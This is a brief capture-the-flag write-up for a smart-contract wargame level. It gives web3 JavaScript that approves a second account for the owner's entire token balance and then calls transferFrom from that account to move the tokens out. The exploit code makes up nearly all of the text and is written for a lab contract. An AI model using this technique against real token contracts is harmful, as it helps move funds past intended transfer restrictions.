# Level 12 - Privacy

First, make sure that you approve an address with the given amount:

```js
await contract.approve("address of approved account", await contract.balanceOf("owner address"))
```

After that, build a transaction with the ```transferFrom()``` function and call it from the approved account:

```js
let payload = web3.eth.abi.encodeFunctionCall({
    name: 'transferFrom',
    type: 'function',
    inputs: [{
        type: 'address',
        name: 'sender'
    },{
        type: 'address',
        name: 'recipient'
    },{
        type: 'uint256',
        name: 'amount'
    }]
}, ["owner address", "approved address", await contract.balanceOf("owner address")]);
// call the next transaction from the approved address!
await web3.eth.sendTransaction({
    to: "contract address",
    from: "approved address",
    data: payload
})
```
